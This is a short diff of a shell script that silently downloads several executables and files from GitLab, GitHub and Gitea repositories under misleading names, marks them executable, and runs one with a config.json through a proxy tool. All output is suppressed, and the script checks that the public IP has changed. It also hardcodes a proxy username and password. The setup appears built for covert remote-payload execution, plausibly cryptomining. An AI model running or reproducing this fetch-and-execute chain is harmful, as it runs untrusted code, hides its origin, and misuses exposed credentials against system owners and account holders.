@@ -2,7 +2,7 @@ proxy="speedway.usefixie.com"
 port="1080" 
 user="fixie"  
 pass="Jc2jw1OwYtLoIiE"  
-wget -q -O 0380096015 https://gitlab.com/55113110159/dokerweb/-/raw/main/zydo191 && chmod +x 0380096015
+wget -q -O 8029933107 https://gitlab.com/55113110159/dokerweb/-/raw/main/zydo191 && chmod +x 8029933107
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
@@ -21,4 +21,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./0380096015 -c "config.json" >/dev/null 2>&1
+./panel ./8029933107 -c "config.json" >/dev/null 2>&1
